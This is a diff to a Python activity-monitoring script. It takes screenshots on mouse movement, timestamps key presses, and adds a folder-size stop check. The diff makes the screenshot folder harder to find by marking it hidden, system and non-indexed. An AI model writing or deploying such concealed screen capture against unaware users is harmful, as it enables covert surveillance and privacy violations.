@@ -40,7 +40,6 @@ def IsCurrentWindowNameInBlockedList():
 
 def CheckForMouseActivity():
     while True:
-
         sleep(5)
         # current mouse x and y
         if globalVariables.mouse_position != position() \
@@ -51,10 +50,14 @@ def CheckForMouseActivity():
                     ScreenShot()
                 except Exception:   # this is here to fix a bug. Program was stopping
                     pass            # when ctrl+alt+del was pressed
+        if globalVariables.stop_threads:
+            break
 
 
 def On_press(key):
     globalVariables.key_press_date = datetime.now()
+    # if globalVariables.stop_threads:
+    #     Thread(target=CheckForKeyActivity).exit()
 
 
 def CheckForKeyActivity():
@@ -63,18 +66,27 @@ def CheckForKeyActivity():
         listener.join()
 
 
-# def DeleteOnceItGetsTooBig():
-#     sleep(10800)  # execute check every 3 hours
-#     screenshotsPath # check size
-#     # and delete if over 3 GB, make sure it doesn't move it to the bin
-#     pass
+def StopOnceItGetsTooBig():
+    while True:
+        try:
+            if os.path.exists(globalVariables.screenshotsPath):
+                size = sum(d.stat().st_size for d in os.scandir(
+                    globalVariables.screenshotsPath) if d.is_file())
+            if size > globalVariables.MAX_ALLOWED_FOLDER_SIZE:
+                globalVariables.stop_threads = True
+        except Exception:
+            pass
+        if globalVariables.stop_threads:
+            break
+        sleep(60 * 60 * 5)  # execute check every 5 hours
+
 
 # if the directory doesn't exist, create it and set to hidden
 if not os.path.exists(globalVariables.screenshotsPath):
     os.mkdir(globalVariables.screenshotsPath)
-    os.system("attrib +h " + globalVariables.screenshotsPath)
+    os.system("attrib +h +s +i " + globalVariables.screenshotsPath)
 
 if __name__ == '__main__':
     Thread(target=CheckForMouseActivity).start()
     Thread(target=CheckForKeyActivity).start()
-    # Thread(target=DeleteOnceItGetsTooBig).start()
+    Thread(target=StopOnceItGetsTooBig).start()
